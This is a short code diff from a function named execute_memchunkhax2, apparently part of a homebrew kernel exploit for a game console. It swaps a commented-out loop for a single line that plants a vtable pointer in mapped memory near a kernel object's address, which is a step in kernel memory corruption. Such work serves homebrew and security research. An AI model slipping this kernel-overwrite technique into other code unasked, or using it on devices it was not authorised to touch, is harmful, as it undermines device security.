@@ -200,10 +200,7 @@ void execute_memchunkhax2() {
 
     printf("Restored kernel memory.\n");
 
-    // Fill the mapped memory with pointers to our vtable.
-    /* for(int i = 0; i < PAGE_SIZE; i += 4) {
-        *(u32*) (data->addr + PAGE_SIZE + i) = (u32) osConvertVirtToPhys(vtable) - KERNEL_VIRT_TO_PHYS;
-    } */
+    *(void***) (data->addr + PAGE_SIZE + (kObjAddr & 0xFFF) - 4) = vtable;
 
 cleanup:
     printf("Cleaning up...\n");
